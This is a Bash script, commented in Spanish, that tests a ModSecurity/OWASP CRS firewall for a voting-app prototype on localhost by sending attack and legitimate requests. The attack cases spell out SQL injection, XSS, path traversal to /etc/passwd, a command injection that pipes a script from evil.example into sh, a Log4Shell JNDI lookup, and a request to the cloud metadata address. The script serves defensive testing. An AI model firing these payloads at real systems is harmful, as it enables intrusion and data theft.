#!/usr/bin/env bash
# Validación del WAF de borde (escenario de seguridad 4, Prototipo 3).
#
# Envía peticiones maliciosas y legítimas a las dos entradas que publica el WAF
# y compara el código HTTP con el esperado:
#   - ataque   → 403 (bloqueado por ModSecurity + OWASP CRS)
#   - legítima → cualquier código distinto de 403 (llega al servicio)
#
# Uso, con el stack levantado (docker compose up -d):
#   bash docs/p3-waf/verify-waf.sh [API_URL] [WEB_URL]
# Por defecto API_URL=http://localhost:8088 y WEB_URL=http://localhost:3000.
# Sale con código 1 si algún caso no da el resultado esperado.

set -u

API="${1:-http://localhost:8088}"
WEB="${2:-http://localhost:3000}"

pass=0
fail=0
UA="Mozilla/5.0 (X11; Linux x86_64) verify-waf"

# check <esperado: block|allow> <descripción> <argumentos de curl...>
check() {
  local expect="$1" desc="$2"
  shift 2
  local code
  code=$(curl -s -o /dev/null -w '%{http_code}' --path-as-is -A "$UA" --max-time 20 "$@")
  local ok=0
  if [[ "$expect" == block && "$code" == 403 ]]; then ok=1; fi
  if [[ "$expect" == allow && "$code" != 403 && "$code" != 000 ]]; then ok=1; fi
  if (( ok )); then
    pass=$((pass + 1)); printf '  ✔ %-7s %-3s  %s\n' "$expect" "$code" "$desc"
  else
    fail=$((fail + 1)); printf '  ✘ %-7s %-3s  %s\n' "$expect" "$code" "$desc"
  fi
}

json=(-H 'Content-Type: application/json')

echo "WAF · API Gateway ($API) y Web SSR ($WEB)"
echo
echo "Ataques (deben dar 403):"
check block "SQLi en query (tautología)"            "$API/api/elections/open?id=1'%20OR%20'1'='1"
check block "SQLi UNION SELECT en query"            "$API/api/analytics/elections?limit=1%20UNION%20SELECT%20username,password%20FROM%20users--"
check block "SQLi en el JSON de login"              "${json[@]}" -X POST "$API/api/auth/login" -d "{\"username\":\"admin' OR 1=1--\",\"password\":\"x\"}"
check block "SQLi en la web (BFF)"                  "$WEB/api/elections/open?q=1;DROP%20TABLE%20users--"
check block "XSS reflejado en query"                "$API/api/elections/open?q=%3Cscript%3Ealert(1)%3C/script%3E"
check block "XSS en el cuerpo JSON"                 "${json[@]}" -X POST "$API/api/auth/login" -d '{"username":"<img src=x onerror=alert(1)>","password":"x"}'
check block "XSS en la web"                         "$WEB/login?next=%3Csvg/onload=alert(document.cookie)%3E"
check block "Path traversal en la ruta"             "$API/api/elections/open/../../../etc/passwd"
check block "Path traversal codificado en query"    "$API/api/elections/open?file=..%2f..%2f..%2fetc%2fpasswd"
check block "Inyección de comandos (Unix)"          "$API/api/elections/open?host=127.0.0.1;cat%20/etc/passwd"
check block "Inyección de comandos en JSON"         "${json[@]}" -X POST "$API/api/auth/login" -d '{"username":"$(curl http://evil.example/x.sh|sh)","password":"x"}'
check block "Log4Shell / JNDI en cabecera"          -H 'X-Api-Version: ${jndi:ldap://evil.example/a}' "$API/api/elections/open"
check block "Escáner (User-Agent sqlmap)"           -H 'User-Agent: sqlmap/1.8' "$API/api/elections/open"
check block "Escáner (User-Agent Nikto)"            -H 'User-Agent: Mozilla/5.00 (Nikto/2.5.0) (Evasions:None)' "$WEB/"
check block "Acceso a archivo sensible (.env)"      "$WEB/.env"
check block "Inclusión remota de archivos (RFI)"    "$API/api/elections/open?page=http://169.254.169.254/latest/meta-data/"
echo
echo "Tráfico legítimo (no debe dar 403):"
check allow "Catálogo de rutas del Gateway"         "$API/api"
check allow "Salud del Gateway"                     "$API/healthz"
check allow "Elecciones abiertas (API)"             "$API/api/elections/open"
check allow "Login con credenciales válidas"        "${json[@]}" -X POST "$API/api/auth/login" -d '{"username":"votante1","password":"prueba123"}'
check allow "Login con contraseña con símbolos"     "${json[@]}" -X POST "$API/api/auth/login" -d '{"username":"votante1","password":"Cl4ve#Segura!2026"}'
check allow "Ruta protegida sin token (401)"        "$API/api/auth/me"
check allow "Página de inicio (web)"                "$WEB/"
check allow "Página de login (web)"                 "$WEB/login"
check allow "Elecciones abiertas vía BFF (web)"     "$WEB/api/elections/open"

echo
echo "Resultado: $pass correctos, $fail fallidos."
(( fail == 0 ))
